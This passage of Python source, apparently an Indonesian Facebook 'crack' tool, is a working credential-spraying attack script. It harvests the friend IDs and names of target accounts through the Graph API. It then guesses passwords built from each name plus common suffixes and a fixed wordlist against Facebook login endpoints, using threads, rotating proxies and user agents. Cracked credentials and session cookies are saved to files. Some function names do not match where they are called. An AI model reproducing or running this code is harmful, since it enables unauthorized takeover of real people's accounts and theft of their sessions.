            f"https://graph.facebook.com/me?fields=id,name,friends&access_token={token}",
            cookies={"cookie": cookie},
        ).json()
        for c in link["friends"]["data"]:
            temanku.append(c["id"] + "|" + c["name"])
    except:
        pass
    os.system("clear")
    banner()
    try:
        key = open(".license","r").read()
    except:
        key = "-"
    negara = requests.get("http://ip-api.com/json/").json()["country"]
    ip = requests.get("http://ip-api.com/json/").json()["query"]
    console.print(Panel(f"{K2}>{H2} {negara}{K2} —» {K2}btw {H2}Fanky ganteng", padding=(0,12), width=60, style=color_panel))
    dia.append(Panel(f"{P2}Android : {H2}Version {android_version}\n{P2}tanggal : {H2}{hari_ini}\n{P2}jam     : {H2}{jam_fan}\n{P2}simcard : {H2}{simcard}",width=30,title=f"{P2}Perangkat",style=f"{color_panel}"))
    # dia.append(Panel(f'{P2}IP      : {H2}{ip}\n{P2}premium : {H2}Premium\n{P2}Negara  : {H2}{negara}',width=30,style=f"{color_panel}"))
    dia.append(
        panel(
            f"{P2}Name   : {H2}{my_name}\n{P2}Idz    : {H2}{my_id}\n{P2}Teman  : {H2}{(len(temanku))}\n{P2}IP     : {H2}{ip}",
            title=f"{P2}Bio Data",
            width=30,
            style=f"{color_panel}",
        )
    )
    console.print(Columns(dia))
    prints(Panel(f"""{P2}[{color_text}01{P2}]. crack dari id publik
[{color_text}02{P2}]. crack dari id Masal
[{color_text}03{P2}]. Logout [[bold red]hapus cookie[bold white]]
[{color_text}04{P2}]. {M2}EXIT{P2}""",width=60,title="MENU",style=f"{color_panel}"))
    HaHi = console.input(f" {H2}• {P2}pilih menu : ")
    if HaHi in ["1", "01"]:
        dump_publik()
    elif HaHi in ["2", "02"]:
        massal()
    elif HaHi in ["3", "03"]:
        os.system('rm -rf .fancookie.txt');os.system('rm -rf .fantoken.txt')
        console.print(f" {H2}• {P2}Berhasil Hapus Cookie")
    elif HaHi in ["4", "04"]:
        exit()
    else:
    	console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! btw fanky ganteng ")

#----------[ CRACK-PUBLIK  ]----------#
def dump_publik():
    with requests.Session() as ses:
        token = open(".fantoken.txt", "r").read()
        cok = open(".fancookie.txt", "r").read()
        prints(
            Panel(
                f"""{P2}masukan id target, pastikan id target bersifat publik""",
                subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",
                width=60,
                style=f"{color_panel}",
            )
        )
        a = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
        if a in ["me", "Me", "ME"]:
            try:
                koH = requests.get(
                    f"https://graph.facebook.com/{a}?fields=friends&access_token={token}",
                    cookies={"cookie": cok},
                ).json()
                for pi in koH["friends"]["data"]:
                    try:
                        id.append(pi["id"] + "|" + pi["name"])
                    except:
                        continue
                setting()
            except Exception as d:
                print(d)
        else:
            try:
                b = ses.get(
                    f"https://graph.facebook.com/{a}?fields=friends&access_token={token}",
                    cookies={"cookie": cok},
                ).json()
                for c in b["friends"]["data"]:
                    id.append(c["id"] + "|" + c["name"])
                setting()
            except Exception as e:
                print(e)
                
# -------------------[ CRACK-Masal ]----------------#
def massal():
    try:
        token = open(".fantoken.txt", "r").read()
        cok = open(".fancookie.txt", "r").read()
    except IOError:
        exit()
    try:
        Console().print(
            Panel(
                "[bold white] Mau Berapa Target Yang Mau Di Crack",
                width=60,
                style=f"{color_panel}",
                title="[bold green] Crack Masal [bold white]",
            )
        )
        jum = int(input(f" • Masukan : "))
    except ValueError:
        Console().print(f" {H2}• {P2} Wrong input ")
        exit()
    if jum < 1 or jum > 80:
        Console().print(f" {H2}• {P2} Pertemanan Tidak Publik  ")
        exit()
    ses = requests.Session()
    yz = 0
    for met in range(jum):
        yz += 1
        Console().print(
            panel(
                "[bold white] Masukkan Target ke " + str(yz) + "",
                width=60,
                style=f"{color_panel}",
            )
        )
        kl = Console().input(f" {H2}• {P2}Masukan : ")
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get(
                f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",
                cookies={"cookie": cok},
            ).json()
            for mi in col["friends"]["data"]:
                try:
                    iso = mi["id"] + "|" + mi["name"]
                    if iso in id:
                        pass
                    else:
                        id.append(iso)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            Console().print(f" {H2}• {P2}Unstable Signal ")
            exit()
    try:
        setting()
    except requests.exceptions.ConnectionError:
        print(f"")
        print(" [+] Unstable Signal ")
        exit()
    except (KeyError, IOError):
        print(f" [+] Pertemanan Tidak Public ")
        time.sleep(3)
        exit()

def convert(cookie):
    cok = "fr=%s;datr=%s;c_user=%s;xs=%s" % (
        cookie["fr"],
        cookie["datr"],
        cookie["c_user"],
        cookie["xs"],
    )
    return str(cok)


def tahun(fx):
    if len(fx) == 15:
        # Untuk ID dengan panjang 15 dan awalan "1000000000" hingga "100000000"
        if fx[:10] == "1000000000":
            tahunz = "2009"
        elif fx[:9] == "100000000":
            tahunz = "2009"
        # ID lebih panjang yang diawali dengan 10000000 (2009)
        elif fx[:8] == "10000000":
            tahunz = "2009"
        # ID yang lebih baru antara 1000000 hingga 1000009 untuk 2009-2010
        elif fx[:7] in ["1000000", "1000001", "1000002", "1000003", "1000004", "1000005"]:
            tahunz = "2009"
        elif fx[:7] in ["1000006", "1000007", "1000008", "1000009"]:
            tahunz = "2010"
        elif fx[:6] == "100001":
            tahunz = "2010"
        elif fx[:6] in ["100002", "100003"]:
            tahunz = "2011"
        elif fx[:6] == "100004":
            tahunz = "2012"
        elif fx[:6] in ["100005", "100006"]:
            tahunz = "2013"
        elif fx[:6] in ["100007", "100008"]:
            tahunz = "2014"
        elif fx[:6] == "100009":
            tahunz = "2015"
        elif fx[:5] == "10001":
            tahunz = "2016"
        elif fx[:5] == "10002":
            tahunz = "2017"
        elif fx[:5] == "10003":
            tahunz = "2018"
        elif fx[:5] == "10004":
            tahunz = "2019"
        elif fx[:5] == "10005":
            tahunz = "2020"
        elif fx[:5] == "10006":
            tahunz = "2021"
        elif fx[:5] == "10009":
            tahunz = "2023"
        elif fx[:5] in ["10007", "10008"]:
            tahunz = "2022"
        
        # Tambahan untuk ID yang dimulai dengan "6"
        elif fx[:10] == "6155383519":
            tahunz = "2015"
        elif fx[:9] == "615538351":
            tahunz = "2015"
        elif fx[:8] == "61553835":
            tahunz = "2015"
        elif fx[:7] == "6155383":
            tahunz = "2015"
        elif fx[:6] == "615538":
            tahunz = "2015"
        elif fx[:6] == "615565":
            tahunz = "2016"
        elif fx[:6] == "615566":
            tahunz = "2016"
        elif fx[:6] == "615567":
            tahunz = "2017"
        elif fx[:6] == "615568":
            tahunz = "2017"
        elif fx[:6] == "615569":
            tahunz = "2018"
        elif fx[:6] == "615570":
            tahunz = "2018"
        else:
            tahunz = ""
    
    elif len(fx) in [9, 10]:
        # ID dengan panjang 9 atau 10 kemungkinan besar dibuat sekitar 2008
        tahunz = "2008"
    elif len(fx) == 8:
        # ID dengan panjang 8 mungkin dibuat sekitar 2007
        tahunz = "2007"
    elif len(fx) == 7:
        # ID dengan panjang 7 kemungkinan besar dibuat sekitar 2006
        tahunz = "2006"
    else:
        tahunz = ""  # ID dengan panjang lainnya tidak diketahui

    return tahunz

# -------------[ PENGATURAN-IDZ ]---------------#
def setting():
    # Validasi variabel global
    global id, id2, method, ualuh, ualu

    # Validasi jika daftar ID kosong
    if not id or not isinstance(id, list):
        print("[bold red]Error:[/bold red] Daftar ID tidak ditemukan atau kosong!")
        return

    # Pilihan metode crack
    Console().print(Panel(
        f"{P2}[{color_text}01{P2}] Crack akun Old [/]\n"
        f"{P2}[{color_text}02{P2}] Crack akun New [/]\n"
        f"{P2}[{color_text}03{P2}] Crack akun Random [[bold green]Recommended[bold white]][/]",
        title=f"[bold green] {len(id)} Akun Tersedia",
        width=60,
        style=f"{color_panel}"
    ))
    
    # Input untuk metode crack
    hu = console.input(f" {H2}• {P2}Masukan : ").strip()
    if hu in ["1", "01"]:
        for tua in sorted(id):  # Urutkan dari lama ke baru
            id2.append(tua)
    elif hu in ["2", "02"]:
        muda = sorted(id)
        id2.extend(muda[::-1])  # Urutkan dari baru ke lama
    elif hu in ["3", "03"]:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)  # Masukkan secara acak
    else:
        print("[bold red]Error:[/bold red] Pilihan tidak valid, coba lagi.")
        return setting()  # Rekursi untuk mengulang input


    # Input untuk metode login
    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph V1[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]graph V2[bold white] [/]\n{P2}[{color_text}03{P2}] Login Site [bold green]touch[bold white] (recommend) [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
    fankylog = console.input(f" {H2}• {P2}Masukan : ").strip()
    if fankylog in ["1", "01"]:
    	method.append("fankygraph")
    elif fankylog in ["2", "02"]:
    	method.append("fankygraphv2")
    elif fankylog in ["3", "03"]:
    	method.append("fankywww")
    else:
    	method.append("fankygraph")  # Default metode
    # Pengaturan User-Agent
    Console().print(Panel(
        f"[bold white]Apakah Anda Ingin Menggunakan UA Manual? Y/T",
        title="[bold green]Setting User-Agent",
        width=60,
        style=f"{color_panel}"
    ))
    uatambah = console.input(f" {H2}• {P2}Masukan : ").strip()
    if uatambah.lower() in ["y", "ya"]:
        ualuh.append("ya")
        bzer = console.input(f" {H2}• {P2}Masukan UA : ").strip()
        ualu.append(bzer)
    else:
        ualuh.append("tidak")

    # Pilihan kecepatan metode
    Console().print(Panel(
        f"{P2}[{color_text}01{P2}] Metode Slow {H2}[Recomended]{P2}\n"
        f"{P2}[{color_text}02{P2}] Metode Cepat {P2}",
        width=60,
        style=f"{color_panel}"
    ))
    hc = console.input(f" {H2}• {P2}Masukan : ").strip()
    if hc in ["1", "01"]:
        metslow()
    elif hc in ["2", "02"]:
        metcepat()
    else:
        metcepat()  # Default ke metode cepat
        

# -------------------[ CRACK-SLOW ]------------#
def metslow():
    global prog, des
    bi = random.choice([u, k, kk, b, h, hh])
    print("")
    urut = []
    urut.append(
        panel(
            f"[bold green]%s [bold white]" % (okc),
            width=30,
            title=f"[bold green]OK SAVE",
            style=f"{color_panel}",
        )
    )
    urut.append(
        panel(
            f"[bold yellow]%s [bold white]" % (cpc),
            width=30,
            title=f"[bold yellow]CP SAVE",
            style=f"{color_panel}",
        )
    )
    wa.print(Columns(urut))
    awal = datetime.datetime.now()
    Console().print(
        Panel(
            f"[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ",
            title=f"[bold yellow]CRACK-SLOW-FANKY-GANTENG",
            width=60,
            style=f"{color_panel}",
        )
    )
    prog = Progress(TextColumn("{task.description}"))
    des = prog.add_task("", total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf, nmf = yuzong.split("|")[0], yuzong.split("|")[1].lower()
                frs = nmf.split(" ")[0]
                pwv = [
                    "pantek123",
                    "indonesia123",
                    "kontol123",
                    "domino123",
                    "anjing123",
                    "sayangku",
                    "maling123",
                    "sayang123",
                    "malang123",
                    "bismillah123",
                    "sayangku123",
                    "bocilku123",
                    "galaksi123",
                    "hacker123",
                ]
                if len(nmf) < 6:
                    if len(frs) < 3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + "321")
                        pwv.append(frs + "123")
                        pwv.append(frs + "1234")
                        pwv.append(frs + "12345")
                        pwv.append(frs + "123456")
                else:
                    if len(frs) < 3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + "321")
                        pwv.append(frs + "2000")
                        pwv.append(frs + "2001")
                        pwv.append(frs + "2002")
                        pwv.append(frs + "2003")
                        pwv.append(frs + "2004")
                        pwv.append(frs + "2005")
                        pwv.append(frs + "2006")
                        pwv.append(frs + "2007")
                        pwv.append(frs + "2008")
                        pwv.append(frs + "2010")
                        pwv.append(frs + "2009")
                        pwv.append(frs + "123")
                        pwv.append(frs + "1234")
                        pwv.append(frs + "12345")
                        pwv.append(frs + "123456")
                        pwv.append(frs + "1234567")
                        pwv.append(frs + "01")
                        pwv.append(frs + "02")
                        pwv.append(frs + "03")
                        pwv.append(frs + "04")
                        pwv.append(frs + "05")
                        pwv.append(frs + "06")
                if "ya" in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:
                    pass
                if "fankygraph" in method:
                	pool.submit(fankygraph,idf,pwv,"graph.facebook.com")
                elif "fankywww" in method:
                	pool.submit(fankywww,idf,pwv)
                elif "fankygraphv2" in method:
                	pool.submit(fankygraphv2,idf,pwv,"graph.facebook.com")
                else:
                	pool.submit(fankygraph,idf,pwv,"graph.facebook.com")
                
                	
                	
    print("")
    Console().print(
        Panel(
            f"[bold green]Crack Telah Selesai ngap, btw fanky ganteng",
            subtitle="╭───",
            subtitle_align="left",
            title=f"[bold green]INFO",
            width=60,
            style=f"{color_panel}",
        )
    )
    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
    print("")


#-------------------[ CRACK-CEPAT ]------------#
def metcepat():
    global prog,des
    bi = random.choice([u,k,kk,b,h,hh])
    print('')
    urut = []
    urut.append(panel(f'[bold green]%s [bold white]'%(okc),width=30,title=f"[bold green]OK SAVE",style=f"{color_panel}"))
    urut.append(panel(f'[bold yellow]%s [bold white]'%(cpc),width=30,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
    wa.print(Columns(urut))
    awal = datetime.datetime.now()
    Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ',title=f"[bold yellow]CRACK-CEPAT",width=60,style=f"{color_panel}"))
    prog = Progress(TextColumn('{task.description}'))
    des = prog.add_task('',total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                frs = nmf.split(" ")[0]
                pwv = ["bismillah123","bismillah","bocilku123"]
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'321')
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                else:
                    if len(frs)<3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'321')
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                if 'ya' in pwpluss: 
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:pass
                if "fankygraph" in method:
                	pool.submit(fankygraph,idf,pwv,"graph.facebook.com")
                elif "fankywww" in method:
                	pool.submit(fankywww,idf,pwv)
                elif "fankygraphv2" in method:
                	pool.submit(fankygraphv2,idf,pwv,"graph.facebook.com")
                else:
                	pool.submit(fankygraph,idf,pwv,"graph.facebook.com")
 
    print("")
    Console().print(
        Panel(
            f"[bold green]Crack Telah Selesai ngap, btw fanky ganteng",
            subtitle="╭───",
            subtitle_align="left",
            title=f"[bold green]INFO",
            width=60,
            style=f"{color_panel}",
        )
    )
    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
    print("")

#-------------------[ CRACK-MAIN ]------------#
def fankygraphv1(idf, pwv, url):
    global loop, ok, cp
    bo = random.choice([m, k, h, b, u, x])
    rr = random.randint
    rc = random.choice
    ses = requests.Session()
    prog.update(des, description=f" {K2}•{H2} FANKY GRAPH V1{H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    #ua = f"Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36"
    ua = random.choice(ugen)
    for pw in pwv:
        try:
            if 'ya' in ualuh: 
                ua = ualu[0]
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            params = ({ "access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16", "sdk_version": random.randint(1, 26), "email": idf, "locale": "zh_CN", "password": pw, "sdk": "Android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5" })
            headers = ({ "Host": url, "x-fb-sim-hni": str(random.randint(100000, 300000)), "x-fb-net-hni": str(random.randint(100000, 300000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-device-group": f"{str(random.randint(1000, 4000))}", "x-fb-friendly-name": "RelayFBNetwork_GemstoneProfilePreloadableNonSelfViewQuery", "x-fb-request-analytics-tags": "unknown", "accept-encoding": "gzip, deflate", "x-fb-http-engine": "Liger", "connection": "close" })
            post = requests.post(f"https://{url}/auth/login?locale=zh_CN", params=params, headers=headers, allow_redirects=False)

            if "User must verify their account" in post.text:
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                break

            elif "session_key" in post.text and "EAA" in post.text:
                ok += 1
                kuki = ";".join(i["name"] + "=" + i["value"] for i in post.json()["session_cookies"]);user = re.findall("c_user=(.*?)", kuki)[0]
                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
                break

            elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
                prog.update(des, description=f" {K2}•{K2} SPAM {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]", end="")
                prog.advance(des)
                time.sleep(10)

            else:
                continue

        except requests.exceptions.ConnectionError:
            time.sleep(31)

    loop += 1


#-------------------[ CRACK-MAIN ]------------#
def fankywww(idf, pwv):
    global loop, ok, cp
    bo = random.choice([m, k, h, b, u, x])
    rr = random.randint
    rc = random.choice
    ses = requests.Session()
    prog.update(des, description=f" {K2}•{H2} NYOBA DULU {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    # ua = "Mozilla/5.0 (Linux; Android 11; SM-G991B Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36"
    ua = random.choice(ugen)
    for pw in pwv:
        try:
            if 'ya' in ualuh: 
                ua = ualu[0]
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            requ = ses.get(f'https://touch.alpha.facebook.com/login.php?')
            head = {
                'authority': 'touch.alpha.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'dpr': '1.600000023841858',
                'origin': 'https://touch.alpha.facebook.com',
                'referer': 'https://touch.alpha.facebook.com/',
                'accept-encoding': 'br, gzip',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
                'sec-ch-ua-full-version-list': f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Linux"',
                'sec-ch-ua-platform-version': '""',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': ua,
                'viewport-width': '980'
            }
            data = {
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(requ.text)).group(1),
                'lsd': re.search('name="lsd" value="(.*?)"', str(requ.text)).group(1),
                'm_ts': re.search('name="m_ts" value="(.*?)"', str(requ.text)).group(1),
                'li': re.search('name="li" value="(.*?)"', str(requ.text)).group(1),
                'email': idf,
                'pass': pw,
                'next': ''
            }
            fankyimut = random.choice(['https://www.facebook.com/login/device-based/regular/login/', 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110', 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NzQxNzE0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'])
            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
            if "checkpoint" in ses.cookies.get_dict().keys():
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = ses.cookies.get_dict()
                kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


def fankygraphv2(idf, pwv,url):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	rr = random.randint
	rc = random.choice
	ses = requests.Session()
	prog.update(des,description=f" {K2}•{H2} FANKY GRAPH V2 {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
	prog.advance(des)
	#ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
	#ua = f"Mozilla/5.0 (Linux; Android 10; SM-G903F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36"
	ua = random.choice(ugen)
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			headers = { "User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger", "Connection": "keep-alive" }
			params = { "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", "sdk_version": random.randint(40, 80), "email": idf, "password": pw, "locale": "id_ID", "sdk": "android", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6", "advertiser_id": str(uuid.uuid4()), "device_id": str(uuid.uuid4()), "family_device_id": str(uuid.uuid4()), "credentials_type": "password", "client_country_code": "ID", "method": "auth.login"}
			po = ses.post(f"https://{url}/auth/login", params=params, headers=headers, allow_redirects=False,proxies=proxs)
			if "www.facebook.com" in po.text:
				cp += 1
				tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
				tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
				prints(tree)
				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
				break
			elif "session_key" in po.text:
				ok += 1
				tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"),guide_style="bold grey100")
				tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
				#tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
				prints(tree)
				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
	
# -----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__ == "__main__":
    try:
        os.system("git pull")
    except:
        pass
    try:
        os.mkdir("OK")
    except:
        pass
    try:
        os.mkdir("CP")
    except:
        pass
    try:
        os.mkdir("data")
    except:
        pass
    try:
        os.system("touch .prox.txt")
    except:
        pass
    try:
        os.system("clear")
    except:
        pass
    mainduluyuk()
    
